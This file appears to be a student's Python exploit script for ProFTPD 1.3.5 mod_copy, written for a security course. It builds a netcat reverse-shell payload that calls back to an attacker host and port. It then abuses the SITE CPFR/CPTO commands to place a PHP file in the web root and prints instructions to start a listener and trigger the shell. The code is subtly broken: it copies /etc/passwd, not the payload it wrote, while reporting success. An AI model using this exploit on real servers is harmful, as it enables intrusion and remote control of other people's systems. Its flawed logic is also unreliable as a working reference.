#!/usr/bin/env python3

import ftplib
import time
import os
import socket

# ---------------------------
# Exploit for ProFTPD 1.3.5 mod_copy
# ICS344 Custom Script for Phase 1
# ---------------------------

RHOST = "10.0.2.7"  # Change if needed
RPORT = 21
LHOST = "10.0.2.5"  # Attacker IP (your Kali IP)
LPORT = 4444
REVERSE_SHELL_NAME = "exploit.php"
SITE_PATH = "/var/www/html"

# Payload: Reverse Shell using Netcat
payload = f"rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {LHOST} {LPORT} > /tmp/f"

# Save payload locally as a PHP file to upload
php_payload = f'<?php system("{payload}"); ?>'
with open(REVERSE_SHELL_NAME, 'w') as f:
    f.write('<?php system("' + payload + '"); ?>')

print("[+] Created PHP payload file")

# Connect to FTP server and upload via mod_copy exploit
def exploit_ftp():
    try:
        ftp = ftplib.FTP()
        ftp.connect(RHOST, RPORT)
        ftp.login()
        print("[+] Connected to FTP server")

        # Send SITE CPFR (copy from)
        ftp.sendcmd(f"SITE CPFR /etc/passwd")
        ftp.sendcmd(f"SITE CPTO {SITE_PATH}/{REVERSE_SHELL_NAME}")
        print(f"[+] Payload copied to {SITE_PATH}/{REVERSE_SHELL_NAME}")
        ftp.quit()
    except Exception as e:
        print("[-] Exploit failed:", e)

# Start listener (manual)
def start_listener():
    print("[!] Start a listener with: nc -lvnp", LPORT)

# Trigger the reverse shell
trigger_url = f"http://{RHOST}/{REVERSE_SHELL_NAME}"

def main():
    print("[+] Exploiting ProFTPD with mod_copy...")
    exploit_ftp()
    print("[+] Exploit complete. Manually visit:", trigger_url)
    print("[+] Or use curl: curl", trigger_url)
    start_listener()

if __name__ == "__main__":
    main()